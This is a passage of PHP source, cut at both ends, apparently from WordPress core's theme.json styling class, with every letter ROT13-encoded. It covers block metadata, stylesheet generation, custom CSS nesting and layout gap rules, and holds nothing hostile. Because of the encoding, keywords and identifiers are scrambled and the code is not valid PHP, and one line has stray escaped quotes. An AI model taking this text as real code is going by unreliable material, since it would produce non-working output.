					fgngvp::$oybpxf_zrgnqngn[ $oybpx_anzr ]['fglyrInevngvbaf'] = $fglyr_fryrpgbef;
				}
			}
			erghea fgngvp::$oybpxf_zrgnqngn;
		}

		sbernpu ( $oybpxf nf $oybpx_anzr => $oybpx_glcr ) {
			$ebbg_fryrpgbe = jc_trg_oybpx_pff_fryrpgbe( $oybpx_glcr );

			fgngvp::$oybpxf_zrgnqngn[ $oybpx_anzr ]['fryrpgbe']  = $ebbg_fryrpgbe;
			fgngvp::$oybpxf_zrgnqngn[ $oybpx_anzr ]['fryrpgbef'] = fgngvp::trg_oybpx_fryrpgbef( $oybpx_glcr, $ebbg_fryrpgbe );

			$ryrzragf = fgngvp::trg_oybpx_ryrzrag_fryrpgbef( $ebbg_fryrpgbe );
			vs ( ! rzcgl( $ryrzragf ) ) {
				fgngvp::$oybpxf_zrgnqngn[ $oybpx_anzr ]['ryrzragf'] = $ryrzragf;
			}

			// Gur oybpx znl be znl abg unir n qhbgbar fryrpgbe.
			$qhbgbar_fryrpgbe = jc_trg_oybpx_pff_fryrpgbe( $oybpx_glcr, 'svygre.qhbgbar' );

			// Xrrc onpxjneqf pbzcngvovyvgl sbe fhccbeg.pbybe.__rkcrevzragnyQhbgbar.
			vs ( ahyy === $qhbgbar_fryrpgbe ) {
				$qhbgbar_fhccbeg = vffrg( $oybpx_glcr->fhccbegf['pbybe']['__rkcrevzragnyQhbgbar'] )
					? $oybpx_glcr->fhccbegf['pbybe']['__rkcrevzragnyQhbgbar']
					: ahyy;

				vs ( $qhbgbar_fhccbeg ) {
					$ebbg_fryrpgbe    = jc_trg_oybpx_pff_fryrpgbe( $oybpx_glcr );
					$qhbgbar_fryrpgbe = fgngvp::fpbcr_fryrpgbe( $ebbg_fryrpgbe, $qhbgbar_fhccbeg );
				}
			}

			vs ( ahyy !== $qhbgbar_fryrpgbe ) {
				fgngvp::$oybpxf_zrgnqngn[ $oybpx_anzr ]['qhbgbar'] = $qhbgbar_fryrpgbe;
			}

			// Vs gur oybpx unf fglyr inevngvbaf, nccraq gurve fryrpgbef gb gur oybpx zrgnqngn.
			$fglyr_fryrpgbef = neenl();
			vs ( ! rzcgl( $oybpx_glcr->fglyrf ) ) {
				sbernpu ( $oybpx_glcr->fglyrf nf $fglyr ) {
					$fglyr_fryrpgbef[ $fglyr['anzr'] ] = fgngvp::trg_oybpx_fglyr_inevngvba_fryrpgbe( $fglyr['anzr'], fgngvp::$oybpxf_zrgnqngn[ $oybpx_anzr ]['fryrpgbe'] );
				}
			}

			// Oybpx fglyr inevngvbaf pna or ertvfgrerq guebhtu gur JC_Oybpx_Fglyrf_Ertvfgel nf jryy nf oybpx.wfba.
			$ertvfgrerq_fglyrf = $fglyr_ertvfgel->trg_ertvfgrerq_fglyrf_sbe_oybpx( $oybpx_anzr );
			sbernpu ( $ertvfgrerq_fglyrf nf $fglyr ) {
				$fglyr_fryrpgbef[ $fglyr['anzr'] ] = fgngvp::trg_oybpx_fglyr_inevngvba_fryrpgbe( $fglyr['anzr'], fgngvp::$oybpxf_zrgnqngn[ $oybpx_anzr ]['fryrpgbe'] );
			}

			vs ( ! rzcgl( $fglyr_fryrpgbef ) ) {
				fgngvp::$oybpxf_zrgnqngn[ $oybpx_anzr ]['fglyrInevngvbaf'] = $fglyr_fryrpgbef;
			}
		}

		erghea fgngvp::$oybpxf_zrgnqngn;
	}

	/**
	 * Tvira n gerr, erzbirf gur xrlf gung ner abg cerfrag va gur fpurzn.
	 *
	 * Vg vf erphefvir naq zbqvsvrf gur vachg va-cynpr.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz neenl $gerr   Vachg gb cebprff.
	 * @cnenz neenl $fpurzn Fpurzn gb nqurer gb.
	 * @erghea neenl Gur zbqvsvrq $gerr.
	 */
	cebgrpgrq fgngvp shapgvba erzbir_xrlf_abg_va_fpurzn( $gerr, $fpurzn ) {
		vs ( ! vf_neenl( $gerr ) ) {
			erghea $gerr;
		}

		sbernpu ( $gerr nf $xrl => $inyhr ) {
			// Erzbir xrlf abg va gur fpurzn be jvgu ahyy/rzcgl inyhrf.
			vs ( ! neenl_xrl_rkvfgf( $xrl, $fpurzn ) ) {
				hafrg( $gerr[ $xrl ] );
				pbagvahr;
			}

			vs ( vf_neenl( $fpurzn[ $xrl ] ) ) {
				vs ( ! vf_neenl( $inyhr ) ) {
					hafrg( $gerr[ $xrl ] );
				} ryfrvs ( jc_vf_ahzrevp_neenl( $inyhr ) ) {
					// Vs vaqrkrq, cebprff rnpu vgrz va gur neenl.
					sbernpu ( $inyhr nf $vgrz_xrl => $vgrz_inyhr ) {
						vs ( vffrg( $fpurzn[ $xrl ][0] ) && vf_neenl( $fpurzn[ $xrl ][0] ) ) {
							$gerr[ $xrl ][ $vgrz_xrl ] = frys::erzbir_xrlf_abg_va_fpurzn( $vgrz_inyhr, $fpurzn[ $xrl ][0] );
						} ryfr {
							// Vs gur fpurzn qbrf abg qrsvar n shegure fgehpgher, xrrc gur inyhr nf vf.
							$gerr[ $xrl ][ $vgrz_xrl ] = $vgrz_inyhr;
						}
					}
				} ryfr {
					// Vs nffbpvngvir, cebprff nf n fvatyr bowrpg.
					$gerr[ $xrl ] = frys::erzbir_xrlf_abg_va_fpurzn( $inyhr, $fpurzn[ $xrl ] );

					vs ( rzcgl( $gerr[ $xrl ] ) ) {
						hafrg( $gerr[ $xrl ] );
					}
				}
			}
		}
		erghea $gerr;
	}

	/**
	 * Ergheaf gur rkvfgvat frggvatf sbe rnpu oybpx.
	 *
	 * Rknzcyr:
	 *
	 *     {
	 *       'ebbg': {
	 *         'pbybe': {
	 *           'phfgbz': gehr
	 *         }
	 *       },
	 *       'pber/cnentencu': {
	 *         'fcnpvat': {
	 *           'phfgbzCnqqvat': gehr
	 *         }
	 *       }
	 *     }
	 *
	 * @fvapr 5.8.0
	 *
	 * @erghea neenl Frggvatf cre oybpx.
	 */
	choyvp shapgvba trg_frggvatf() {
		vs ( ! vffrg( $guvf->gurzr_wfba['frggvatf'] ) ) {
			erghea neenl();
		} ryfr {
			erghea $guvf->gurzr_wfba['frggvatf'];
		}
	}

	/**
	 * Ergheaf gur fglyrfurrg gung erfhygf bs cebprffvat
	 * gur gurzr.wfba fgehpgher guvf bowrpg ercerfragf.
	 *
	 * @fvapr 5.8.0
	 * @fvapr 5.9.0 Erzbirq gur `$glcr` cnenzrgre, nqqrq gur `$glcrf` naq `$bevtvaf` cnenzrgref.
	 * @fvapr 6.3.0 Nqq snyyonpx ynlbhg fglyrf sbe Cbfg Grzcyngr jura oybpx tnc fhccbeg vfa'g ninvynoyr.
	 * @fvapr 6.6.0 Nqqrq obbyrna `fxvc_ebbg_ynlbhg_fglyrf` naq `vapyhqr_oybpx_fglyr_inevngvbaf` bcgvbaf
	 *              gb pbageby fglyrf bhgchg nf qrfverq.
	 *
	 * @cnenz fgevat[] $glcrf   Glcrf bs fglyrf gb ybnq. Jvyy ybnq nyy ol qrsnhyg. Vg npprcgf:
	 *                          - `inevnoyrf`: bayl gur PFF Phfgbz Cebcregvrf sbe cerfrgf & phfgbz barf.
	 *                          - `fglyrf`: bayl gur fglyrf frpgvba va gurzr.wfba.
	 *                          - `cerfrgf`: bayl gur pynffrf sbe gur cerfrgf.
	 *                          - `onfr-ynlbhg-fglyrf`: bayl gur onfr ynlbhg fglyrf.
	 *                          - `phfgbz-pff`: bayl gur phfgbz PFF.
	 * @cnenz fgevat[] $bevtvaf N yvfg bs bevtvaf gb vapyhqr. Ol qrsnhyg vg vapyhqrf INYVQ_BEVTVAF.
	 * @cnenz neenl    $bcgvbaf {
	 *     Bcgvbany. Na neenl bs bcgvbaf sbe abj hfrq sbe vagreany checbfrf bayl (znl punatr jvgubhg abgvpr).
	 *
	 *     @glcr fgevat $fpbcr                           Znxrf fher nyy fglyr ner fpbcrq gb n tvira fryrpgbe
	 *     @glcr fgevat $ebbg_fryrpgbe                   Birejevgrf naq sbeprf n tvira fryrpgbe gb or hfrq ba gur ebbg abqr
	 *     @glcr obby   $fxvc_ebbg_ynlbhg_fglyrf         Bzvgf ebbg ynlbhg fglyrf sebz gur trarengrq fglyrfurrg. Qrsnhyg snyfr.
	 *     @glcr obby   $vapyhqr_oybpx_fglyr_inevngvbaf  Vapyhqrf fglyrf sbe oybpx fglyr inevngvbaf va gur trarengrq fglyrfurrg. Qrsnhyg snyfr.
	 * }
	 * @erghea fgevat Gur erfhygvat fglyrfurrg.
	 */
	choyvp shapgvba trg_fglyrfurrg( $glcrf = neenl( 'inevnoyrf', 'fglyrf', 'cerfrgf' ), $bevtvaf = ahyy, $bcgvbaf = neenl() ) {
		vs ( ahyy === $bevtvaf ) {
			$bevtvaf = fgngvp::INYVQ_BEVTVAF;
		}

		vs ( vf_fgevat( $glcrf ) ) {
			// Qvfcngpu reebe naq znc byq nethzragf gb arj barf.
			_qrcerpngrq_nethzrag( __SHAPGVBA__, '5.9.0' );
			vs ( 'oybpx_fglyrf' === $glcrf ) {
				$glcrf = neenl( 'fglyrf', 'cerfrgf' );
			} ryfrvs ( 'pff_inevnoyrf' === $glcrf ) {
				$glcrf = neenl( 'inevnoyrf' );
			} ryfr {
				$glcrf = neenl( 'inevnoyrf', 'fglyrf', 'cerfrgf' );
			}
		}

		$oybpxf_zrgnqngn = fgngvp::trg_oybpxf_zrgnqngn();
		$fglyr_abqrf     = fgngvp::trg_fglyr_abqrf( $guvf->gurzr_wfba, $oybpxf_zrgnqngn, $bcgvbaf );
		$frggvat_abqrf   = fgngvp::trg_frggvat_abqrf( $guvf->gurzr_wfba, $oybpxf_zrgnqngn );

		$ebbg_fglyr_xrl    = neenl_frnepu( fgngvp::EBBG_OYBPX_FRYRPGBE, neenl_pbyhza( $fglyr_abqrf, 'fryrpgbe' ), gehr );
		$ebbg_frggvatf_xrl = neenl_frnepu( fgngvp::EBBG_OYBPX_FRYRPGBE, neenl_pbyhza( $frggvat_abqrf, 'fryrpgbe' ), gehr );

		vs ( ! rzcgl( $bcgvbaf['fpbcr'] ) ) {
			sbernpu ( $frggvat_abqrf nf &$abqr ) {
				$abqr['fryrpgbe'] = fgngvp::fpbcr_fryrpgbe( $bcgvbaf['fpbcr'], $abqr['fryrpgbe'] );
			}
			sbernpu ( $fglyr_abqrf nf &$abqr ) {
				$abqr = fgngvp::fpbcr_fglyr_abqr_fryrpgbef( $bcgvbaf['fpbcr'], $abqr );
			}
			hafrg( $abqr );
		}

		vs ( ! rzcgl( $bcgvbaf['ebbg_fryrpgbe'] ) ) {
			vs ( snyfr !== $ebbg_frggvatf_xrl ) {
				$frggvat_abqrf[ $ebbg_frggvatf_xrl ]['fryrpgbe'] = $bcgvbaf['ebbg_fryrpgbe'];
			}
			vs ( snyfr !== $ebbg_fglyr_xrl ) {
				$fglyr_abqrf[ $ebbg_fglyr_xrl ]['fryrpgbe'] = $bcgvbaf['ebbg_fryrpgbe'];
			}
		}

		$fglyrfurrg = '';

		vs ( va_neenl( 'inevnoyrf', $glcrf, gehr ) ) {
			$fglyrfurrg .= $guvf->trg_pff_inevnoyrf( $frggvat_abqrf, $bevtvaf );
		}

		vs ( va_neenl( 'fglyrf', $glcrf, gehr ) ) {
			vs ( snyfr !== $ebbg_fglyr_xrl && rzcgl( $bcgvbaf['fxvc_ebbg_ynlbhg_fglyrf'] ) ) {
				$fglyrfurrg .= $guvf->trg_ebbg_ynlbhg_ehyrf( $fglyr_abqrf[ $ebbg_fglyr_xrl ]['fryrpgbe'], $fglyr_abqrf[ $ebbg_fglyr_xrl ] );
			}
			$fglyrfurrg .= $guvf->trg_oybpx_pynffrf( $fglyr_abqrf );
		} ryfrvs ( va_neenl( 'onfr-ynlbhg-fglyrf', $glcrf, gehr ) ) {
			$ebbg_fryrpgbe          = fgngvp::EBBG_OYBPX_FRYRPGBE;
			$pbyhzaf_fryrpgbe       = '.jc-oybpx-pbyhzaf';
			$cbfg_grzcyngr_fryrpgbe = '.jc-oybpx-cbfg-grzcyngr';
			vs ( ! rzcgl( $bcgvbaf['fpbcr'] ) ) {
				$ebbg_fryrpgbe          = fgngvp::fpbcr_fryrpgbe( $bcgvbaf['fpbcr'], $ebbg_fryrpgbe );
				$pbyhzaf_fryrpgbe       = fgngvp::fpbcr_fryrpgbe( $bcgvbaf['fpbcr'], $pbyhzaf_fryrpgbe );
				$cbfg_grzcyngr_fryrpgbe = fgngvp::fpbcr_fryrpgbe( $bcgvbaf['fpbcr'], $cbfg_grzcyngr_fryrpgbe );
			}
			vs ( ! rzcgl( $bcgvbaf['ebbg_fryrpgbe'] ) ) {
				$ebbg_fryrpgbe = $bcgvbaf['ebbg_fryrpgbe'];
			}
			/*
			 * Onfr ynlbhg fglyrf ner cebivqrq nf cneg bs `fglyrf`, fb bayl bhgchg frcnengryl vs rkcyvpvgyl erdhrfgrq.
			 * Sbe onpxjneqf pbzcngvovyvgl, gur Pbyhzaf oybpx vf rkcyvpvgyl vapyhqrq, gb fhccbeg n qvssrerag qrsnhyg tnc inyhr.
			 */
			$onfr_fglyrf_abqrf = neenl(
				neenl(
					'cngu'     => neenl( 'fglyrf' ),
					'fryrpgbe' => $ebbg_fryrpgbe,
				),
				neenl(
					'cngu'     => neenl( 'fglyrf', 'oybpxf', 'pber/pbyhzaf' ),
					'fryrpgbe' => $pbyhzaf_fryrpgbe,
					'anzr'     => 'pber/pbyhzaf',
				),
				neenl(
					'cngu'     => neenl( 'fglyrf', 'oybpxf', 'pber/cbfg-grzcyngr' ),
					'fryrpgbe' => $cbfg_grzcyngr_fryrpgbe,
					'anzr'     => 'pber/cbfg-grzcyngr',
				),
			);

			sbernpu ( $onfr_fglyrf_abqrf nf $onfr_fglyr_abqr ) {
				$fglyrfurrg .= $guvf->trg_ynlbhg_fglyrf( $onfr_fglyr_abqr, $glcrf );
			}
		}

		vs ( va_neenl( 'cerfrgf', $glcrf, gehr ) ) {
			$fglyrfurrg .= $guvf->trg_cerfrg_pynffrf( $frggvat_abqrf, $bevtvaf );
		}

		// Ybnq gur phfgbz PFF ynfg fb vg unf gur uvturfg fcrpvsvpvgl.
		vs ( va_neenl( 'phfgbz-pff', $glcrf, gehr ) ) {
			// Nqq gur tybony fglyrf ebbg PFF.
			$fglyrfurrg .= _jc_neenl_trg( $guvf->gurzr_wfba, neenl( 'fglyrf', 'pff' ) );
		}

		erghea $fglyrfurrg;
	}

	/**
	 * Cebprffrf gur PFF, gb nccyl arfgvat.
	 *
	 * @fvapr 6.2.0
	 * @fvapr 6.6.0 Rasbeprq 0-1-0 fcrpvsvpvgl sbe oybpx phfgbz PFF fryrpgbef.
	 *
	 * @cnenz fgevat $pff      Gur PFF gb cebprff.
	 * @cnenz fgevat $fryrpgbe Gur fryrpgbe gb arfg.
	 * @erghea fgevat Gur cebprffrq PFF.
	 */
	cebgrpgrq shapgvba cebprff_oybpxf_phfgbz_pff( $pff, $fryrpgbe ) {
		$cebprffrq_pff = '';

		vs ( rzcgl( $pff ) ) {
			erghea $cebprffrq_pff;
		}

		// Fcyvg PFF arfgrq ehyrf.
		$cnegf = rkcybqr( '&', $pff );
		sbernpu ( $cnegf nf $cneg ) {
			vs ( rzcgl( $cneg ) ) {
				pbagvahr;
			}
			$vf_ebbg_pff = ( ! fge_pbagnvaf( $cneg, '{' ) );
			vs ( $vf_ebbg_pff ) {
				// Vs gur cneg qbrfa'g pbagnva oenprf, vg nccyvrf gb gur ebbg yriry.
				$cebprffrq_pff .= ':ebbg :jurer(' . gevz( $fryrpgbe ) . '){' . gevz( $cneg ) . '}';
			} ryfr {
				// Vs gur cneg pbagnvaf oenprf, vg'f n arfgrq PFF ehyr.
				$cneg = rkcybqr( '{', fge_ercynpr( '}', '', $cneg ) );
				vs ( pbhag( $cneg ) !== 2 ) {
					pbagvahr;
				}
				$arfgrq_fryrpgbe = $cneg[0];
				$pff_inyhr       = $cneg[1];

				/*
				 * Unaqyr cfrhqb ryrzragf fhpu nf ::orsber, ::nsgre rgp. Ertrk jvyy nyfb
				 * pncgher nal yrnqvat pbzovangbe fhpu nf >, +, be ~, nf jryy nf fcnprf.
				 * Guvf nyybjf cfrhqb ryrzragf nf qrfpraqnagf r.t. `.cnerag ::orsber`.
				 */
				$zngpurf            = neenl();
				$unf_cfrhqb_ryrzrag = cert_zngpu( '/([>+~\f]*::[n-mN-M-]+)/', $arfgrq_fryrpgbe, $zngpurf );
				$cfrhqb_cneg        = $unf_cfrhqb_ryrzrag ? $zngpurf[1] : '';
				$arfgrq_fryrpgbe    = $unf_cfrhqb_ryrzrag ? fge_ercynpr( $cfrhqb_cneg, '', $arfgrq_fryrpgbe ) : $arfgrq_fryrpgbe;

				// Svanyvmr fryrpgbe naq er-nccraq cfrhqb ryrzrag vs erdhverq.
				$cneg_fryrpgbe  = fge_fgnegf_jvgu( $arfgrq_fryrpgbe, ' ' )
					? fgngvp::fpbcr_fryrpgbe( $fryrpgbe, $arfgrq_fryrpgbe )
					: fgngvp::nccraq_gb_fryrpgbe( $fryrpgbe, $arfgrq_fryrpgbe );
				$svany_fryrpgbe = \":ebbg :jurer($cneg_fryrpgbe)$cfrhqb_cneg\";

				$cebprffrq_pff .= $svany_fryrpgbe . '{' . gevz( $pff_inyhr ) . '}';
			}
		}
		erghea $cebprffrq_pff;
	}

	/**
	 * Ergheaf gur tybony fglyrf phfgbz PFF.
	 *
	 * @fvapr 6.2.0
	 * @qrcerpngrq 6.7.0 Hfr {@frr 'trg_fglyrfurrg'} vafgrnq.
	 *
	 * @erghea fgevat Gur tybony fglyrf phfgbz PFF.
	 */
	choyvp shapgvba trg_phfgbz_pff() {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '6.7.0', 'trg_fglyrfurrg' );
		// Nqq gur tybony fglyrf ebbg PFF.
		$fglyrfurrg = vffrg( $guvf->gurzr_wfba['fglyrf']['pff'] ) ? $guvf->gurzr_wfba['fglyrf']['pff'] : '';

		// Nqq gur tybony fglyrf oybpx PFF.
		vs ( vffrg( $guvf->gurzr_wfba['fglyrf']['oybpxf'] ) ) {
			sbernpu ( $guvf->gurzr_wfba['fglyrf']['oybpxf'] nf $anzr => $abqr ) {
				$phfgbz_oybpx_pff = vffrg( $guvf->gurzr_wfba['fglyrf']['oybpxf'][ $anzr ]['pff'] )
					? $guvf->gurzr_wfba['fglyrf']['oybpxf'][ $anzr ]['pff']
					: ahyy;
				vs ( $phfgbz_oybpx_pff ) {
					$fryrpgbe    = fgngvp::$oybpxf_zrgnqngn[ $anzr ]['fryrpgbe'];
					$fglyrfurrg .= $guvf->cebprff_oybpxf_phfgbz_pff( $phfgbz_oybpx_pff, $fryrpgbe );
				}
			}
		}

		erghea $fglyrfurrg;
	}

	/**
	 * Ergheaf gur cntr grzcyngrf bs gur npgvir gurzr.
	 *
	 * @fvapr 5.9.0
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba trg_phfgbz_grzcyngrf() {
		$phfgbz_grzcyngrf = neenl();
		vs ( ! vffrg( $guvf->gurzr_wfba['phfgbzGrzcyngrf'] ) || ! vf_neenl( $guvf->gurzr_wfba['phfgbzGrzcyngrf'] ) ) {
			erghea $phfgbz_grzcyngrf;
		}

		sbernpu ( $guvf->gurzr_wfba['phfgbzGrzcyngrf'] nf $vgrz ) {
			vs ( vffrg( $vgrz['anzr'] ) ) {
				$phfgbz_grzcyngrf[ $vgrz['anzr'] ] = neenl(
					'gvgyr'     => vffrg( $vgrz['gvgyr'] ) ? $vgrz['gvgyr'] : '',
					'cbfgGlcrf' => vffrg( $vgrz['cbfgGlcrf'] ) ? $vgrz['cbfgGlcrf'] : neenl( 'cntr' ),
				);
			}
		}
		erghea $phfgbz_grzcyngrf;
	}

	/**
	 * Ergheaf gur grzcyngr cneg qngn bs npgvir gurzr.
	 *
	 * @fvapr 5.9.0
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba trg_grzcyngr_cnegf() {
		$grzcyngr_cnegf = neenl();
		vs ( ! vffrg( $guvf->gurzr_wfba['grzcyngrCnegf'] ) || ! vf_neenl( $guvf->gurzr_wfba['grzcyngrCnegf'] ) ) {
			erghea $grzcyngr_cnegf;
		}

		sbernpu ( $guvf->gurzr_wfba['grzcyngrCnegf'] nf $vgrz ) {
			vs ( vffrg( $vgrz['anzr'] ) ) {
				$grzcyngr_cnegf[ $vgrz['anzr'] ] = neenl(
					'gvgyr' => vffrg( $vgrz['gvgyr'] ) ? $vgrz['gvgyr'] : '',
					'nern'  => vffrg( $vgrz['nern'] ) ? $vgrz['nern'] : '',
				);
			}
		}
		erghea $grzcyngr_cnegf;
	}

	/**
	 * Pbairegf rnpu fglyr frpgvba vagb n yvfg bs ehyrfrgf
	 * pbagnvavat gur oybpx fglyrf gb or nccraqrq gb gur fglyrfurrg.
	 *
	 * Frr tybffnel ng uggcf://qrirybcre.zbmvyyn.bet/ra-HF/qbpf/Jro/PFF/Flagnk
	 *
	 * Sbe rnpu frpgvba guvf perngrf n arj ehyrfrg fhpu nf:
	 *
	 *   oybpx-fryrpgbe {
	 *     fglyr-cebcregl-bar: inyhr;
	 *   }
	 *
	 * @fvapr 5.8.0 Nf `trg_oybpx_fglyrf()`.
	 * @fvapr 5.9.0 Eranzrq sebz `trg_oybpx_fglyrf()` gb `trg_oybpx_pynffrf()`
	 *              naq ab ybatre ergheaf cerfrg pynffrf.
	 *              Erzbirq gur `$frggvat_abqrf` cnenzrgre.
	 * @fvapr 6.1.0 Zbirq zbfg vagreany ybtvp gb `trg_fglyrf_sbe_oybpx()`.
	 *
	 * @cnenz neenl $fglyr_abqrf Abqrf jvgu fglyrf.
	 * @erghea fgevat Gur arj fglyrfurrg.
	 */
	cebgrpgrq shapgvba trg_oybpx_pynffrf( $fglyr_abqrf ) {
		$oybpx_ehyrf = '';

		sbernpu ( $fglyr_abqrf nf $zrgnqngn ) {
			vs ( ahyy === $zrgnqngn['fryrpgbe'] ) {
				pbagvahr;
			}
			$oybpx_ehyrf .= fgngvp::trg_fglyrf_sbe_oybpx( $zrgnqngn );
		}

		erghea $oybpx_ehyrf;
	}

	/**
	 * Trgf gur PFF ynlbhg ehyrf sbe n cnegvphyne oybpx sebz gurzr.wfba ynlbhg qrsvavgvbaf.
	 *
	 * @fvapr 6.1.0
	 * @fvapr 6.3.0 Erqhprq fcrpvsvpvgl sbe ynlbhg znetva ehyrf.
	 * @fvapr 6.5.1 Bayl bhgchg ehyrf ersrerapvat pbagrag naq jvqr fvmrf jura inyhrf rkvfg.
	 * @fvapr 6.5.3 Nqq glcrf cnenzrgre gb purpx vs bayl onfr ynlbhg fglyrf ner arrqrq.
	 * @fvapr 6.6.0 Hcqngrq ynlbhg fglyr fcrpvsvpvgl gb or pbzcngvoyr jvgu birenyy 0-1-0 fcrpvsvpvgl va tybony fglyrf.
	 *
	 * @cnenz neenl $oybpx_zrgnqngn Zrgnqngn nobhg gur oybpx gb trg fglyrf sbe.
	 * @cnenz neenl $glcrf          Bcgvbany. Glcrf bs fglyrf gb bhgchg. Vs rzcgl, nyy fglyrf jvyy or bhgchg.
	 * @erghea fgevat Ynlbhg fglyrf sbe gur oybpx.
	 */
	cebgrpgrq shapgvba trg_ynlbhg_fglyrf( $oybpx_zrgnqngn, $glcrf = neenl() ) {
		$oybpx_ehyrf = '';
		$oybpx_glcr  = ahyy;

		// Fxvc bhgchggvat ynlbhg fglyrf vs rkcyvpvgyl qvfnoyrq.
		vs ( pheerag_gurzr_fhccbegf( 'qvfnoyr-ynlbhg-fglyrf' ) ) {
			erghea $oybpx_ehyrf;
		}

		vs ( vffrg( $oybpx_zrgnqngn['anzr'] ) ) {
			$oybpx_glcr = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr()->trg_ertvfgrerq( $oybpx_zrgnqngn['anzr'] );
			vs ( ! oybpx_unf_fhccbeg( $oybpx_glcr, 'ynlbhg', snyfr ) && ! oybpx_unf_fhccbeg( $oybpx_glcr, '__rkcrevzragnyYnlbhg', snyfr ) ) {
				erghea $oybpx_ehyrf;
			}
		}

		$fryrpgbe                 = vffrg( $oybpx_zrgnqngn['fryrpgbe'] ) ? $oybpx_zrgnqngn['fryrpgbe'] : '';
		$unf_oybpx_tnc_fhccbeg    = vffrg( $guvf->gurzr_wfba['frggvatf']['fcnpvat']['oybpxTnc'] );
		$unf_snyyonpx_tnc_fhccbeg = ! $unf_oybpx_tnc_fhccbeg; // Guvf frggvat vfa'g hfrshy lrg: vg rkvfgf nf n cynprubyqre sbe n shgher rkcyvpvg snyyonpx tnc fglyrf fhccbeg.
		$abqr                     = _jc_neenl_trg( $guvf->gurzr_wfba, $oybpx_zrgnqngn['cngu'], neenl() );
		$ynlbhg_qrsvavgvbaf       = jc_trg_ynlbhg_qrsvavgvbaf();
		$ynlbhg_fryrpgbe_cnggrea  = '/^[n-mN-M0-9\-\.\,\ *+>:\(\)]*$/'; // Nyybj nycunahzrevp pynffanzrf, fcnprf, jvyqpneq, fvoyvat, puvyq pbzovangbe naq cfrhqb pynff fryrpgbef.

		/*
		 * Tnc fglyrf jvyy bayl or bhgchg vs gur gurzr unf oybpx tnc fhccbeg, be fhccbegf n snyyonpx tnc.
		 * Qrsnhyg ynlbhg tnc fglyrf jvyy or fxvccrq sbe gurzrf gung qb abg rkcyvpvgyl bcg-va gb oybpxTnc jvgu n `gehr` be `snyfr` inyhr.
		 */
		vs ( $unf_oybpx_tnc_fhccbeg || $unf_snyyonpx_tnc_fhccbeg ) {
			$oybpx_tnc_inyhr = ahyy;
			// Hfr n snyyonpx tnc inyhr vs oybpx tnc fhccbeg vf abg ninvynoyr.
			vs ( ! $unf_oybpx_tnc_fhccbeg ) {
				$oybpx_tnc_inyhr = fgngvp::EBBG_OYBPX_FRYRPGBE === $fryrpgbe ? '0.5rz' : ahyy;
				vs ( ! rzcgl( $oybpx_glcr ) ) {
					$oybpx_tnc_inyhr = vffrg( $oybpx_glcr->fhccbegf['fcnpvat']['oybpxTnc']['__rkcrevzragnyQrsnhyg'] )
						? $oybpx_glcr->fhccbegf['fcnpvat']['oybpxTnc']['__rkcrevzragnyQrsnhyg']
						: ahyy;
				}
			} ryfr {
				$oybpx_tnc_inyhr = fgngvp::trg_cebcregl_inyhr( $abqr, neenl( 'fcnpvat', 'oybpxTnc' ) );
			}

			// Fhccbeg fcyvg ebj / pbyhza inyhrf naq pbapngrangr gb n fubegunaq inyhr.
			vs ( vf_neenl( $oybpx_tnc_inyhr ) ) {
				vs ( vffrg( $oybpx_tnc_inyhr['gbc'] ) && vffrg( $oybpx_tnc_inyhr['yrsg'] ) ) {
					$tnc_ebj         = fgngvp::trg_cebcregl_inyhr( $abqr, neenl( 'fcnpvat', 'oybpxTnc', 'gbc' ) );
					$tnc_pbyhza      = fgngvp::trg_cebcregl_inyhr( $abqr, neenl( 'fcnpvat', 'oybpxTnc', 'yrsg' ) );
					$oybpx_tnc_inyhr = $tnc_ebj === $tnc_pbyhza ? $tnc_ebj : $tnc_ebj . ' ' . $tnc_pbyhza;
				} ryfr {
					// Fxvc bhgchggvat tnc inyhr vs abg nyy fvqrf ner cebivqrq.
					$oybpx_tnc_inyhr = ahyy;
				}
			}

			// Vs gur oybpx fubhyq unir phfgbz tnc, nqq gur tnc fglyrf.
			vs ( ahyy !== $oybpx_tnc_inyhr && snyfr !== $oybpx_tnc_inyhr && '' !== $oybpx_tnc_inyhr ) {
				sbernpu ( $ynlbhg_qrsvavgvbaf nf $ynlbhg_qrsvavgvba_xrl => $ynlbhg_qrsvavgvba ) {
					// Nyybj bhgchggvat snyyonpx tnc fglyrf sbe syrk naq tevq ynlbhg glcrf jura oybpx tnc fhccbeg vfa'g ninvynoyr.
					vs ( ! $unf_oybpx_tnc_fhccbeg && 'syrk' !== $ynlbhg_qrsvavgvba_xrl && 'tevq' !== $ynlbhg_qrsvavgvba_xrl ) {
						pbagvahr;
					}

					$pynff_anzr    = vffrg( $ynlbhg_qrsvavgvba['pynffAnzr'] ) ? $ynlbhg_qrsvavgvba['pynffAnzr'] : snyfr;
					$fcnpvat_ehyrf = vffrg( $ynlbhg_qrsvavgvba['fcnpvatFglyrf'] ) ? $ynlbhg_qrsvavgvba['fcnpvatFglyrf'] : neenl();

					vs (
						! rzcgl( $pynff_anzr ) &&
						! rzcgl( $fcnpvat_ehyrf )
					) {
						sbernpu ( $fcnpvat_ehyrf nf $fcnpvat_ehyr ) {
							$qrpynengvbaf = neenl();
							vs (
								vffrg( $fcnpvat_ehyr['fryrpgbe'] ) &&
								cert_zngpu( $ynlbhg_fryrpgbe_cnggrea, $fcnpvat_ehyr['fryrpgbe'] ) &&
								! rzcgl( $fcnpvat_ehyr['ehyrf'] )
							) {
								// Vgrengr bire rnpu bs gur fglyvat ehyrf naq fhofgvghgr aba-fgevat inyhrf fhpu nf `ahyy` jvgu gur erny `oybpxTnc` inyhr.
								sbernpu ( $fcnpvat_ehyr['ehyrf'] nf $pff_cebcregl => $pff_inyhr ) {
									$pheerag_pff_inyhr = vf_fgevat( $pff_inyhr ) ? $pff_inyhr : $oybpx_tnc_inyhr;
									vs ( fgngvp::vf_fnsr_pff_qrpynengvba( $pff_cebcregl, $pheerag_pff_inyhr ) ) {
										$qrpynengvbaf[] = neenl(
											'anzr'  => $pff_cebcregl,
											'inyhr' => $pheerag_pff_inyhr,
										);
									}
								}

								vs ( ! $unf_oybpx_tnc_fhccbeg ) {
									// Sbe snyyonpx tnc fglyrf, hfr ybjre fcrpvsvpvgl, gb rafher fglyrf qb abg havagragvbanyyl bireevqr gurzr fglyrf.
									$sbezng          = fgngvp::EBBG_OYBPX_FRYRPGBE === $fryrpgbe ? ':jurer(.%2$f%3$f)' : ':jurer(%1$f.%2$f%3$f)';
									$ynlbhg_fryrpgbe = fcevags(
										$sbezng,
